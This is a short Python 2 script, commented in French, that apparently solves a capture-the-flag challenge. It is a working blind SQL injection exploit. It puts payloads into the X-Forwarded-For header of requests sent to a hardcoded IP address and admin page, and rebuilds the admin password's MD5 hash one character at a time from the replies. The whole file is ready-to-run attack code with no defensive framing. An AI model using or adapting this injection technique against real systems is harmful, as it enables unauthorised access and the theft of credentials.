#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests

# Dictionnaire à tester
chars = '0123456789abcdef'

checking_str = 'Non mauvais password'
pwd_size = 32

# Hash MD5 en retour
result = ''

url = 'http://95.142.162.76:8082/index.php?p=admin'
data = {'username' : 'admin', 'password' : 'admin'}

print 'Merci de patienter pendant que le script récupère le hash du password...'

for index in range(pwd_size + 1):
    for char in chars:
        # Réécriture du header pour injection SQL
        headers = { 'X-FORWARDED-FOR' : '127.0.0.1\' OR substr(password, %s, 1) = %s #' % (str(index), str(hex(ord(char)))) }
        
        req = requests.post(url, data=data, headers=headers)

        # Vérification du contenu retourné pour valider le caractère courant
        if req.text.find(checking_str) == -1:
            print 'Caractère en position %d trouvé.' % index
            result = result + char
            break

# resultat retrouver, flag ok
# retourner resultat
print 'Hash md5 : %s' % result
